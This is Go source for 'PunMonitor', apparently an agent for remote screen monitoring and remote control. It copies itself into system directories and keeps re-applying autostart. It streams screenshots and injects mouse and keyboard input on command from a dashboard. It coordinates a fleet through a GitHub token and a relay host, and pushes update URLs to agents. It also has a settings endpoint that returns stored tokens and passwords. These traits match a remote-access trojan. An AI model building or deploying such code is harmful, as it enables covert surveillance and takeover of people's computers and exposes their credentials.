package main

import (
	"bufio"
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"io"
	"math"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
	"github.com/pion/webrtc/v4"
	"github.com/quic-go/quic-go"
)

//go:embed dashboard.html
var dashboardHTML string

var startTime = time.Now()

var (
	myHostname   string
	agentConnsMu sync.RWMutex
	agentConns   = make(map[string]*websocket.Conn)
	connAgentID  = make(map[*websocket.Conn]string)
)

type WireMessage struct {
    Type    string `json:"type"`
    Data    []byte `json:"data,omitempty"`
    AgentID string `json:"agentId,omitempty"`
    Server  bool   `json:"server,omitempty"`
}


const MSG_FRAME = "frame"

var wsClients sync.Map

// agentSystemInfo stores system info for each connected agent
var agentSystemInfo sync.Map

// knownAgents stores all agents ever seen (including disconnected ones) for registration tracking
var knownAgents sync.Map

// webrtcAgentDataChannels stores incoming WebRTC data channels from agents (reverse direction)
var webrtcAgentDataChannels sync.Map

// dashboardContent holds the embedded HTML dashboard
var dashboardContent string

var (
    electionInterval  = 5 * time.Minute
    electionIntervalMu sync.RWMutex
    electionRetries   int
)

func (wm *WireMessage) Marshal() []byte {
	data, _ := json.Marshal(wm)
	return data
}

type Config struct {
	mu                   sync.Mutex
	ConfigPort           int
	MonthlyLimitMB       int64
	IsServerMode         bool
	GitHubRepo           string
	GitHubToken          string
	MaxFPS               float64
	AuthUser             string
	AuthPass             string
	TunnelProvider       string
	TunnelHostname       string
	ServerURL            string
	CloudflareAccountTag string
	CloudflareTunnelSecret string
    CloudflareTunnelID   string
    ElectionInterval    string
    AgentID             string
    UpdateURL           string
    TurnServerURL       string
    TurnServerCredential string
}

type SettingsFile struct {
	ConfigPort             int              `json:"config_port"`
	MaxFPS                 float64          `json:"max_fps"`
	GitHubRepo             string           `json:"github_repo"`
	GitHubToken            string           `json:"github_token"`
	AuthUser               string           `json:"auth_user"`
	AuthPass               string           `json:"auth_pass"`
	MonthlyLimitMB         int64            `json:"monthly_limit_mb"`
	TunnelProvider         string           `json:"tunnel_provider"`
	TunnelHostname         string           `json:"tunnel_hostname"`
	ServerURL              string           `json:"server_url"`
	CloudflareAccountTag   string           `json:"cloudflare_account_tag"`
	CloudflareTunnelSecret string           `json:"cloudflare_tunnel_secret"`
	CloudflareTunnelID     string           `json:"cloudflare_tunnel_id"`
    ElectionInterval       string           `json:"election_interval,omitempty"`
    AgentID                string           `json:"agent_id,omitempty"`
    HiddenAgents           map[string]bool  `json:"hidden_agents,omitempty"`
    UpdateURL              string           `json:"update_url,omitempty"`
    TurnServerURL          string           `json:"turn_server_url,omitempty"`
    TurnServerCredential   string           `json:"turn_server_credential,omitempty"`
}

type CaptureTier int

const (
	CaptureTierAuto CaptureTier = iota
	CaptureTierLow
	CaptureTierHigh
)

type Transport interface {
	Send(*WireMessage) error
	Recv() (*WireMessage, error)
	Name() string
}

type BandwidthMonitor struct {
	mu         sync.Mutex
	LimitMB    int64
	UsedBytes  int64
	LastReset  time.Time
	RateWindow []int64
	WindowSize int
}

func NewBandwidthMonitor(limitMB int64) *BandwidthMonitor {
	return &BandwidthMonitor{LimitMB: limitMB, WindowSize: 10, RateWindow: make([]int64, 0, 10), LastReset: time.Now()}
}

func (bm *BandwidthMonitor) SetLimitMB(limitMB int64) { bm.mu.Lock(); defer bm.mu.Unlock(); bm.LimitMB = limitMB }
func (bm *BandwidthMonitor) RecordBytes(n int) {
	bm.mu.Lock(); defer bm.mu.Unlock()
	bm.UsedBytes += int64(n)
	bm.RateWindow = append(bm.RateWindow, int64(n))
	if len(bm.RateWindow) > bm.WindowSize {
		bm.RateWindow = bm.RateWindow[1:]
	}
}
func (bm *BandwidthMonitor) GetThrottleDelay() time.Duration {
	bm.mu.Lock(); defer bm.mu.Unlock()
	if bm.LimitMB == 0 { return 0 }
	if float64(bm.UsedBytes)/1024/1024 >= float64(bm.LimitMB) { return time.Second * 10 }
	return 0
}
func (bm *BandwidthMonitor) GetUsedMB() float64 { bm.mu.Lock(); defer bm.mu.Unlock(); return float64(bm.UsedBytes) / 1024 / 1024 }
func (bm *BandwidthMonitor) GetCurrentRateKBps() float64 {
	bm.mu.Lock(); defer bm.mu.Unlock()
	if len(bm.RateWindow) == 0 { return 0 }
	var sum int64
	for _, v := range bm.RateWindow { sum += v }
	return float64(sum) / float64(len(bm.RateWindow)) / 1024
}
func (bm *BandwidthMonitor) GetLimitMB() int64 { bm.mu.Lock(); defer bm.mu.Unlock(); return bm.LimitMB }
func (bm *BandwidthMonitor) IsOverLimit() bool {
	bm.mu.Lock(); defer bm.mu.Unlock()
	if bm.LimitMB == 0 { return false }
	return float64(bm.UsedBytes)/1024/1024 >= float64(bm.LimitMB)
}
func (bm *BandwidthMonitor) Reset() {
	bm.mu.Lock(); defer bm.mu.Unlock()
	bm.UsedBytes = 0; bm.RateWindow = make([]int64, 0, bm.WindowSize)
}

type ActivityEvent struct {
	Timestamp int64  `json:"ts"`
	Type      string `json:"type"`
	Detail    string `json:"detail,omitempty"`
}

type InputEvent struct {
	MouseMove  func(int, int)
	MouseClick func(int, int, bool)
	KeyPress   func(uint16)
	TypeText   func(string)
}

var logFileHandle *os.File
var logFileMu sync.Mutex

func ensureLogFile() {
	logFileMu.Lock()
	defer logFileMu.Unlock()
	if logFileHandle != nil {
		return
	}
	f, err := os.OpenFile(filepath.Join(dataDir(), "monitor.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	logFileHandle = f
}

func llog(level string, format string, args ...interface{}) {
	ts := time.Now().Format("15:04:05.000")
	msg := fmt.Sprintf(format, args...)
	line := ts + " [" + level + "] " + msg
	fmt.Println(line)
	ensureLogFile()
	logFileMu.Lock()
	if logFileHandle != nil {
		logFileHandle.WriteString(line + "\n")
	}
	logFileMu.Unlock()
}

func dataDir() string {
	if runtime.GOOS == "windows" {
		if ad := os.Getenv("APPDATA"); ad != "" {
			d := filepath.Join(ad, "PunMonitor")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	if runtime.GOOS == "darwin" {
		if home := os.Getenv("HOME"); home != "" {
			d := filepath.Join(home, "Library", "Application Support", "PunMonitor")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	// Linux / fallback for Unix
	if xdg := os.Getenv("XDG_DATA_HOME"); xdg != "" {
		d := filepath.Join(xdg, "punmonitor")
		os.MkdirAll(d, 0755)
		return d
	}
	if home := os.Getenv("HOME"); home != "" {
		d := filepath.Join(home, ".local", "share", "punmonitor")
		os.MkdirAll(d, 0755)
		return d
	}
	exe, _ := os.Executable()
	return filepath.Dir(exe)
}

// binDir returns the permanent directory for the binary (separate from data dir).
// On first run, if the binary is not already here, it copies itself here.
func binDir() string {
	if runtime.GOOS == "windows" {
		if pf := os.Getenv("ProgramFiles"); pf != "" {
			d := filepath.Join(pf, "PunMonitor")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	if runtime.GOOS == "darwin" {
		d := "/usr/local/lib/punmonitor"
		os.MkdirAll(d, 0755)
		return d
	}
	// Linux
	d := "/usr/local/lib/punmonitor"
	os.MkdirAll(d, 0755)
	return d
}

// ensureBinaryRelocated copies itself to binDir() if not already there,
// then updates autostart to point there. The watchdog later uses the
// permanent path when restarting the main process.
// This avoids circular watchdog-lock issues since we never re-exec.
func ensureBinaryRelocated() {
	permDir := binDir()
	exe, err := os.Executable()
	if err != nil {
		return
	}
	permPath := filepath.Join(permDir, filepath.Base(exe))
	// Already at the permanent location
	if strings.EqualFold(exe, permPath) {
		return
	}
	llog("info", "Relocating binary from %s to %s", exe, permPath)
	src, err := os.Open(exe)
	if err != nil {
		llog("error", "Cannot open self for relocation: %v", err)
		return
	}
	dst, err := os.OpenFile(permPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		src.Close()
		llog("error", "Cannot write %s: %v", permPath, err)
		return
	}
	if _, err := io.Copy(dst, src); err != nil {
		src.Close()
		dst.Close()
		llog("error", "Failed to copy binary: %v", err)
		return
	}
	src.Close()
	dst.Close()
	llog("info", "Binary relocated to %s – autostart will use permanent path after setupAutostart", permPath)
}

var cfg = &Config{}

var (
	serverCtx    context.Context
	serverCancel context.CancelFunc
	tunnelCmd    *exec.Cmd
	hiddenAgents sync.Map
)

var httpFastClient = &http.Client{Timeout: 10 * time.Second}

// global flags and maps
var agentMode bool
var connAgentIDMu sync.RWMutex

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil { return "unknown" }
	// Prefer non-APIPA address (skip 169.254.x.x)
	var fallback string
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if !ok || ipnet.IP.IsLoopback() || ipnet.IP.To4() == nil {
			continue
		}
		ip := ipnet.IP.String()
		if strings.HasPrefix(ip, "169.254.") {
			if fallback == "" { fallback = ip }
			continue
		}
		return ip
	}
	if fallback != "" { return fallback }
	return "unknown"
}

var cachedWANIP string
var wanIPOnce sync.Once

func getWANIP() string {
	wanIPOnce.Do(func() {
		resp, err := http.Get("https://api.ipify.org?format=text")
		if err != nil { cachedWANIP = "unknown"; return }
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		cachedWANIP = strings.TrimSpace(string(b))
		if cachedWANIP == "" { cachedWANIP = "unknown" }
	})
	return cachedWANIP
}

func getHostname() string {
	h, err := os.Hostname()
	if err != nil { return "unknown" }
	return h
}

func randomString(n int) string {
    letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func loadCredentials() {
	data, err := os.ReadFile(filepath.Join(dataDir(), "punmonitor-credentials.json"))
	if err != nil {
		llog("info", "No credentials file found at punmonitor-credentials.json, skipping")
		return
	}
	var creds struct {
		AccountTag   string `json:"AccountTag"`
		TunnelSecret string `json:"TunnelSecret"`
		TunnelID     string `json:"TunnelID"`
	}
	if err := json.Unmarshal(data, &creds); err != nil {
		llog("error", "Failed to parse credentials file: %v", err)
		return
	}
	if creds.AccountTag != "" {
		cfg.CloudflareAccountTag = creds.AccountTag
	}
	if creds.TunnelSecret != "" {
		cfg.CloudflareTunnelSecret = creds.TunnelSecret
	}
	if creds.TunnelID != "" {
		cfg.CloudflareTunnelID = creds.TunnelID
	}
	llog("info", "Loaded Cloudflare credentials: AccountTag=%s, TunnelID=%s", cfg.CloudflareAccountTag, cfg.CloudflareTunnelID)
}

func settingsFilePath() string {
	return filepath.Join(dataDir(), "settings.json")
}

func saveSettings() error {
	// Collect hidden agents from sync.Map
	hiddenMap := make(map[string]bool)
	hiddenAgents.Range(func(k, v interface{}) bool {
		hiddenMap[k.(string)] = v.(bool)
		return true
	})
	s := SettingsFile{
		ConfigPort:             cfg.ConfigPort,
		MaxFPS:                 cfg.MaxFPS,
		GitHubRepo:             cfg.GitHubRepo,
		GitHubToken:            cfg.GitHubToken,
		AuthUser:               cfg.AuthUser,
		AuthPass:               cfg.AuthPass,
		MonthlyLimitMB:         cfg.MonthlyLimitMB,
		TunnelProvider:         cfg.TunnelProvider,
		TunnelHostname:         cfg.TunnelHostname,
		ServerURL:              cfg.ServerURL,
		CloudflareAccountTag:   cfg.CloudflareAccountTag,
		CloudflareTunnelSecret: cfg.CloudflareTunnelSecret,
		CloudflareTunnelID:     cfg.CloudflareTunnelID,
        AgentID:                cfg.AgentID,
        HiddenAgents:           hiddenMap,
        UpdateURL:              cfg.UpdateURL,
        TurnServerURL:          cfg.TurnServerURL,
        TurnServerCredential:   cfg.TurnServerCredential,
	}
	data, err := json.MarshalIndent(s, "", "  ")
	if err != nil { return err }
	err = os.WriteFile(settingsFilePath(), data, 0644)
	if err == nil {
		pushCredsToGitHub()
	}
	return err
}

func loadSettings() {
	data, err := os.ReadFile(settingsFilePath())
	if err != nil { return }
	var s SettingsFile
	if err := json.Unmarshal(data, &s); err != nil { return }
	if s.ConfigPort != 0 { cfg.ConfigPort = s.ConfigPort }
	if s.MaxFPS > 0 { cfg.MaxFPS = s.MaxFPS }
	if s.GitHubRepo != "" { cfg.GitHubRepo = s.GitHubRepo }
	if s.GitHubToken != "" { cfg.GitHubToken = s.GitHubToken }
	if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
	if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
	if s.MonthlyLimitMB > 0 { cfg.MonthlyLimitMB = s.MonthlyLimitMB }
	if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
	if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
	if s.CloudflareTunnelID != "" { cfg.CloudflareTunnelID = s.CloudflareTunnelID }
    if s.AgentID != "" { cfg.AgentID = s.AgentID }
	if s.HiddenAgents != nil {
		for id, hidden := range s.HiddenAgents {
			hiddenAgents.Store(id, hidden)
		}
	}
	if s.UpdateURL != "" { cfg.UpdateURL = s.UpdateURL }
	if s.TurnServerURL != "" { cfg.TurnServerURL = s.TurnServerURL }
	if s.TurnServerCredential != "" { cfg.TurnServerCredential = s.TurnServerCredential }
	llog("info", "Loaded saved settings from %s", settingsFilePath())
}

func getElectionInterval() time.Duration {
    electionIntervalMu.RLock()
    defer electionIntervalMu.RUnlock()
    return electionInterval
}

func setElectionInterval(d time.Duration) {
    electionIntervalMu.Lock()
    defer electionIntervalMu.Unlock()
    electionInterval = d
}

func loadElectionInterval() {
    const defaultInterval = 5 * time.Minute
    if cfg.ElectionInterval == "" {
        setElectionInterval(defaultInterval)
        return
    }
    d, err := time.ParseDuration(cfg.ElectionInterval)
    if err != nil {
        setElectionInterval(defaultInterval)
        return
    }
    setElectionInterval(d)
}

func startScreenCapture(ctx context.Context) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in screen capture: %v", r)
		}
	}()
	fps := cfg.MaxFPS
    if fps <= 0 {
        fps = 1
    }
    interval := time.Duration(float64(time.Second) / fps)
    for {
        select {
        case <-time.After(interval):
            img, err := captureScreen()
            if err != nil {
                llog("error", "screen capture failed: %v", err)
                continue
            }
            var buf bytes.Buffer
            if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
                continue
            }
            wm := WireMessage{Type: MSG_FRAME, Data: buf.Bytes(), AgentID: cfg.AgentID}
            msg := wm.Marshal()
            broadcastFrame(msg, &wm)
        case <-ctx.Done():
            return
        }
    }
}

func handleWSMessage(conn *websocket.Conn, msg []byte) {
	var msgMap map[string]interface{}
	if err := json.Unmarshal(msg, &msgMap); err != nil {
		return
	}
	msgType, _ := msgMap["type"].(string)
	switch msgType {
	case "hello":
		llog("info", "WebSocket client hello received")
	case MSG_FRAME:
		var wm WireMessage
		if err := json.Unmarshal(msg, &wm); err == nil {
			llog("debug", "Server received frame from agent %s (%d bytes raw)", wm.AgentID, len(msg))
			broadcastFrame(msg, &wm)
		}
	case "set_fps":
		if fps, ok := msgMap["fps"].(float64); ok && fps > 0 {
			cfg.MaxFPS = fps
			saveSettings()
			if serverCancel != nil { serverCancel() }
			serverCtx, serverCancel = context.WithCancel(context.Background())
			go startScreenCapture(serverCtx)
		}
	case "set_quality":
	case "set_bandwidth_limit":
		if mb, ok := msgMap["mb"].(float64); ok {
			cfg.MonthlyLimitMB = int64(mb)
			saveSettings()
		}
	case "set_cloudflare_credentials":
		if tag, ok := msgMap["account_tag"].(string); ok { cfg.CloudflareAccountTag = tag }
		if secret, ok := msgMap["tunnel_secret"].(string); ok { cfg.CloudflareTunnelSecret = secret }
		if id, ok := msgMap["tunnel_id"].(string); ok { cfg.CloudflareTunnelID = id }
		saveSettings()
		pushCredsToGitHub()
		llog("info", "Cloudflare credentials updated via dashboard")
	case "set_transport_order":
		llog("info", "Transport order updated: %v", msgMap["order"])
	case "generate_share_link":
		agentID, _ := msgMap["agentId"].(string)
		shareURL := buildShareURL(agentID)
		reply, _ := json.Marshal(map[string]interface{}{
			"type": "share_link",
			"url":  shareURL,
		})
		conn.WriteMessage(websocket.TextMessage, reply)
	case "promote_to_server":
		if target, ok := msgMap["target"].(string); ok && target != "" {
			agentConnsMu.RLock()
			agentConn, exists := agentConns[target]
			agentConnsMu.RUnlock()
			if exists {
				forward, _ := json.Marshal(msgMap)
				agentConn.WriteMessage(websocket.TextMessage, forward)
				llog("info", "Forwarded promote_to_server to agent %s", target)
			} else {
				llog("warn", "Agent %s not found for promote", target)
			}
		} else {
			cfg.IsServerMode = true
			llog("info", "Promoted to server mode via dashboard")
			if serverCancel != nil { serverCancel() }
			serverCtx, serverCancel = context.WithCancel(context.Background())
			go startScreenCapture(serverCtx)
			reply, _ := json.Marshal(map[string]string{"type": "promoted", "status": "ok"})
			conn.WriteMessage(websocket.TextMessage, reply)
		}
	case "webrtc_offer":
		sdp, _ := msgMap["sdp"].(string)
		connID := fmt.Sprintf("%s-%d", cfg.AgentID, time.Now().UnixNano())
		isAgent := false
		if a, ok := msgMap["agent"].(bool); ok && a {
			isAgent = true
		}
		go webrtcManager.HandleOffer(connID, sdp, conn, isAgent)
	case "webrtc_ice":
		candidate, _ := msgMap["candidate"].(string)
		webrtcManager.HandleICE("", candidate)
	case "mouse_move":
		if target, ok := msgMap["agentId"].(string); ok && target != "" {
			forwardToAgent(target, msg)
			return
		}
		if x, ok := msgMap["x"].(float64); ok {
			if y, ok := msgMap["y"].(float64); ok {
				winMouseMove(int(x), int(y))
			}
		}
	case "mouse_click":
		if target, ok := msgMap["agentId"].(string); ok && target != "" {
			forwardToAgent(target, msg)
			return
		}
		btn, _ := msgMap["button"].(string)
		winMouseClick(0, 0, btn != "right")
	case "key_press":
		if target, ok := msgMap["agentId"].(string); ok && target != "" {
			forwardToAgent(target, msg)
			return
		}
		if key, ok := msgMap["key"].(float64); ok {
			winKeyPress(uint16(key))
		}
	default:
		llog("debug", "Received WebSocket message type=%s", msgType)
	}

}




func startGitHubLeaderElection() {
    if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
        llog("info", "No GitHub config – running as standalone server")
        runServerComponents()
        return
}
	for {
		cfg.IsServerMode = false
		agentMode = false
		leader, err := tryClaimLeadership()
		if err != nil {
			electionRetries++
			if electionRetries >= 3 {
				llog("error", "Election failed after %d retries: %v – checking for existing server", electionRetries, err)
				electionRetries = 0
				serverURL := cfg.ServerURL
				if serverURL == "" {
					serverURL = "https://relay.recruitedge.us"
				}
				checkURL := serverURL + "/api/health"
				foundServer := false
				for i := 0; i < 15; i++ {
					checkReq, _ := http.NewRequest("GET", checkURL, nil)
					checkReq.Header.Set("User-Agent", "PunMonitor-Election")
					httpClient := &http.Client{Timeout: 5 * time.Second}
					checkResp, checkErr := httpClient.Do(checkReq)
					if checkErr == nil && checkResp.StatusCode == 200 {
						checkResp.Body.Close()
						llog("info", "Existing server detected at %s after ~%ds – connecting as agent", serverURL, i*3)
						foundServer = true
						break
					}
					if checkErr != nil {
						llog("debug", "Health check attempt %d/15: %v", i+1, checkErr)
					} else {
						checkResp.Body.Close()
					}
					time.Sleep(3 * time.Second)
				}
				if foundServer {
					agentMode = true
					runAgentClient()
				} else {
					llog("info", "No existing server detected after 45s – running as standalone server")
					cfg.IsServerMode = true
					runServerComponents()
				}
				llog("error", "Fallback cycle ended, re-electing after jitter")
				time.Sleep(jitterDuration(10, 20))
				continue
			}
			llog("error", "Election error (%d/3): %v – retrying", electionRetries, err)
			time.Sleep(jitterDuration(3, 7))
			continue
		}
		electionRetries = 0
		if leader {


            llog("info", "Elected as leader on %s", myHostname)
            cfg.IsServerMode = true
            runServerComponents()
            llog("error", "Server stopped, re-electing after jitter")
            time.Sleep(jitterDuration(10, 20))
        } else {
            llog("info", "Not the leader – connecting as agent")
            agentMode = true
            runAgentClient()
            llog("error", "Agent disconnected, re-electing after jitter")
            time.Sleep(jitterDuration(5, 10))
        }
    }
}

func jitterDuration(minSec, maxSec int) time.Duration {
    return time.Duration(minSec+int(rand.Intn(maxSec-minSec+1))) * time.Second
}

func tryClaimLeadership() (bool, error) {
    rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/primary_server.json", cfg.GitHubRepo)
    req, _ := http.NewRequest("GET", rawURL, nil)
    resp, err := httpFastClient.Do(req)
    if err != nil {
        return false, fmt.Errorf("failed to read primary_server.json: %w", err)
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusNotFound {
        llog("info", "No primary_server.json found, attempting to claim leadership")
        return writePrimaryServerFile(cfg.AgentID, "")
    }

    if resp.StatusCode != http.StatusOK {
        return false, fmt.Errorf("GitHub raw fetch returned %d", resp.StatusCode)
    }

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return false, fmt.Errorf("failed to read body: %w", err)
    }

    var primary struct {
        Host    string `json:"host"`
        Updated int64  `json:"updated"`
    }
    if err := json.Unmarshal(body, &primary); err != nil {
        return false, fmt.Errorf("failed to parse primary file: %w", err)
    }

    interval := getElectionInterval()
    if primary.Host == cfg.AgentID {
        llog("info", "Already the leader, renewing leadership")
        return writePrimaryServerFile(cfg.AgentID, "")
    }

    if time.Since(time.UnixMilli(primary.Updated)) > interval {
        llog("info", "Leader %s is stale, attempting to take over", primary.Host)
        return writePrimaryServerFile(cfg.AgentID, "")
    }

    llog("info", "Active leader: %s (updated %s ago)", primary.Host, time.Since(time.UnixMilli(primary.Updated)))
    return false, nil
}

func writePrimaryServerFile(hostname, sha string) (bool, error) {
    content := map[string]interface{}{
        "host":    hostname,
        "updated": time.Now().UnixMilli(),
    }
    contentData, _ := json.Marshal(content)
    encoded := base64.StdEncoding.EncodeToString(contentData)
    payload := map[string]interface{}{
        "message": "leader election: " + hostname,
        "content": encoded,
        "branch":  "main",
    }
    if sha != "" {
        payload["sha"] = sha
    }
    payloadData, _ := json.Marshal(payload)
    apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/primary_server.json", cfg.GitHubRepo)
    req, err := http.NewRequest("PUT", apiURL, bytes.NewReader(payloadData))
    if err != nil { return false, err }
    req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
    req.Header.Set("Content-Type", "application/json")
    resp, err := httpFastClient.Do(req)
    if err != nil {
        return false, err
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusCreated || resp.StatusCode == http.StatusOK {
        return true, nil
    }
    if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusConflict {
        return false, nil // Failed to claim (no token or already claimed), act as agent
    }
return false, fmt.Errorf("GitHub API returned %d", resp.StatusCode)
}

func renewLeadership() (bool, error) {
    apiURL := fmt.Sprintf("https://api.github.com/repos/%s/contents/primary_server.json", cfg.GitHubRepo)
    req, _ := http.NewRequest("GET", apiURL, nil)
    req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
    req.Header.Set("Accept", "application/vnd.github.v3+json")
    resp, err := httpFastClient.Do(req)
    if err != nil {
        return false, err
    }
    defer resp.Body.Close()
    if resp.StatusCode == http.StatusNotFound {
        llog("info", "No primary_server.json found, claiming leadership")
        return writePrimaryServerFile(cfg.AgentID, "")
    }
    if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
        llog("info", "GitHub auth failed (%d) – acting as agent", resp.StatusCode)
        return false, nil
    }
    if resp.StatusCode != http.StatusOK {
        return false, fmt.Errorf("GitHub API returned %d", resp.StatusCode)
    }
    var ghResp struct {

        Content string `json:"content"`
        SHA     string `json:"sha"`
    }
    if err := json.NewDecoder(resp.Body).Decode(&ghResp); err != nil {
        llog("error", "Leader renewal – decode failed: %v", err)
        return false, nil
    }
    decoded, err := base64.StdEncoding.DecodeString(ghResp.Content)
    if err != nil {
        return false, nil
    }
    var primary struct {
        Host    string `json:"host"`
        Updated int64  `json:"updated"`
    }
    if err := json.Unmarshal(decoded, &primary); err != nil {
        return false, nil
    }
    if primary.Host != cfg.AgentID {
        llog("warn", "Leader renewed by another host %s – verifying if alive", primary.Host)
        // Grace period: check if new leader is actually serving before stepping down
        checkURL := cfg.ServerURL
        if checkURL == "" {
            checkURL = "https://relay.recruitedge.us"
        }
        checkURL += "/api/health"
        found := false
        for i := 0; i < 5; i++ {
            checkReq, _ := http.NewRequest("GET", checkURL, nil)
            checkReq.Header.Set("User-Agent", "PunMonitor-Election")
            hc := &http.Client{Timeout: 3 * time.Second}
            if resp, err := hc.Do(checkReq); err == nil {
                resp.Body.Close()
                found = true
                break
            }
            time.Sleep(2 * time.Second)
        }
        if found {
            llog("info", "New leader %s is serving – stepping down gracefully", primary.Host)
            cfg.IsServerMode = false
            agentMode = true
            if serverCancel != nil { serverCancel() }
        } else {
            llog("info", "New leader %s not reachable – reclaiming leadership", primary.Host)
            return writePrimaryServerFile(cfg.AgentID, "")
        }
        return true, nil
    }
    return writePrimaryServerFile(cfg.AgentID, ghResp.SHA)
}

func runServerComponents() {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in runServerComponents: %v", r)
		}
	}()
	prov := cfg.TunnelProvider
	if prov == "" {
		prov = "cloudflare"
	}
	if prov == "cloudflare" && cfg.CloudflareTunnelID != "" {
		if err := EnsureCloudflaredInstalled(); err != nil {
			llog("error", "cloudflared setup: %v", err)
		} else {
			llog("info", "Cloudflare credentials found, starting tunnel automatically")
			go startCloudflareTunnel(cfg)
		}
	} else {
		llog("info", "Tunnel provider: %s (no cloudflared needed)", prov)
	}
	serverCtx, serverCancel = context.WithCancel(context.Background())
	go startScreenCapture(serverCtx)
	cfg.IsServerMode = true
	agentSystemInfo.Store(cfg.AgentID, map[string]interface{}{
		"hostname": getHostname(),
		"local_ip": getLocalIP(),
		"wan_ip":   getWANIP(),
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
		"version":  binaryVersion,
		"mode":     "server",
		"boot_time": func() string {
			if globalActivity != nil {
				s := globalActivity.Summary()
				return s["boot_time"]
			}
			return formatTime(systemBootTimeMS())
		}(),
		"wake_up_time": func() string {
			if startTime.IsZero() {
				return "never"
			}
			return startTime.Format("2006-01-02 15:04:05")
		}(),
		"idle_time": func() string {
			if globalActivity != nil {
				s := globalActivity.Summary()
				return s["total_idle"]
			}
			return "0s"
		}(),
	})
	go startTransportMonitor(context.Background())
	go safeRun("leader-renewal", func() {
		ticker := time.NewTicker(getElectionInterval() / 2)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				renewLeadership()
			case <-serverCtx.Done():
				return
			}
		}
	})
	go func() {
		ticker := time.NewTicker(24 * time.Hour)
		for {
			select {
			case <-ticker.C:
				llog("info", "Checking for server updates and credential changes...")
				checkForServerUpdates()
				checkForCloudflareKeyChanges()
			}
		}
	}()

	go func() {
		ticker := time.NewTicker(2 * time.Minute)
		for range ticker.C {
			setupAutostart()
			if cfg.UpdateURL != "" {
				updateMsg, _ := json.Marshal(map[string]string{
					"type": "update",
					"url":  cfg.UpdateURL,
				})
				connAgentIDMu.RLock()
				wsClients.Range(func(key, value interface{}) bool {
					conn := key.(*websocket.Conn)
					if _, isAgent := connAgentID[conn]; isAgent {
						conn.WriteMessage(websocket.TextMessage, updateMsg)
					}
					return true
				})
				connAgentIDMu.RUnlock()
			}
		}
	}()

	llog("info", "Server components started – blocking until cancelled")
	<-serverCtx.Done()
	llog("info", "Server components stopped")
}

func startHTTPServer() {
	// Prefer dashboard.html from dataDir (enables customization without rebuild)
	// Falls back to embedded default (always present for all machines)
	dashboardContent = dashboardHTML
	dashDiskPath := filepath.Join(dataDir(), "dashboard.html")
	if data, err := os.ReadFile(dashDiskPath); err == nil {
		dashboardContent = string(data)
		llog("info", "Dashboard loaded from disk (%d bytes)", len(dashboardContent))
		// Hot-reload: poll for file changes every 3 seconds
		go func() {
			var lastMod time.Time
			if fi, err := os.Stat(dashDiskPath); err == nil {
				lastMod = fi.ModTime()
			}
			ticker := time.NewTicker(3 * time.Second)
			defer ticker.Stop()
			for range ticker.C {
				if fi, err := os.Stat(dashDiskPath); err == nil {
					if fi.ModTime().After(lastMod) {
						lastMod = fi.ModTime()
						if data, err := os.ReadFile(dashDiskPath); err == nil {
							dashboardContent = string(data)
							llog("info", "Dashboard hot-reloaded (%d bytes)", len(dashboardContent))
						}
					}
				}
			}
		}()
	} else {
		llog("info", "No dashboard.html on disk at %s – using embedded default", dashDiskPath)
	}
	llog("info", "Dashboard size: %d bytes", len(dashboardContent))

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if dashboardContent == "" {
			http.Error(w, "dashboard not available", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(dashboardContent))
	})

	http.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
		if dashboardContent == "" {
			http.Error(w, "dashboard not available", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(dashboardContent))
	})

	http.HandleFunc("/api/settings", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if r.Method == "GET" {
			json.NewEncoder(w).Encode(map[string]interface{}{
				"github_repo":               cfg.GitHubRepo,
				"github_token":              cfg.GitHubToken,
				"auth_user":                 cfg.AuthUser,
				"auth_pass":                 cfg.AuthPass,
				"tunnel_provider":           cfg.TunnelProvider,
				"tunnel_hostname":           cfg.TunnelHostname,
				"server_url":                cfg.ServerURL,
				"cloudflare_account_tag":    cfg.CloudflareAccountTag,
